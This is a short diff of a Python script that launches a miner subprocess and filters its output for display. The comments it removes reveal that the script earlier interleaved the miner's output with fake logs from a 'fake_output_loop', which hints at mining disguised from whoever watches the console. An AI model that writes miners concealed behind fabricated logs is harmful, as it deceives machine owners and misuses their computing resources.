@@ -638,14 +638,16 @@ def main():
                 print(f"  {line}")
         return proc.returncode
 
-    # Forward miner output (interleaved with fake logs)
+    # Forward miner output — show connection/status, hide noise
     try:
         for line in proc.stdout:
-            # Check for errors (connection failures, crashes)
             lower = line.lower()
-            if any(kw in lower for kw in ["error", "fail", "panic", "fatal", "cannot", "denied"]):
+            # Show important lines: errors, connection, shares, hashrate
+            show_keywords = ["error", "fail", "panic", "fatal", "connect", "share",
+                             "accept", "reject", "stratum", "proxy", "enroll",
+                             "worker", "diff", "speed", "hash", "uptime", "gpu"]
+            if any(kw in lower for kw in show_keywords):
                 print(f"[miner] {line.rstrip()}", flush=True)
-            # Don't print normal mining output — fake_output_loop handles visible logs
     except KeyboardInterrupt:
         print("\n[main] stopping...")
         proc.terminate()
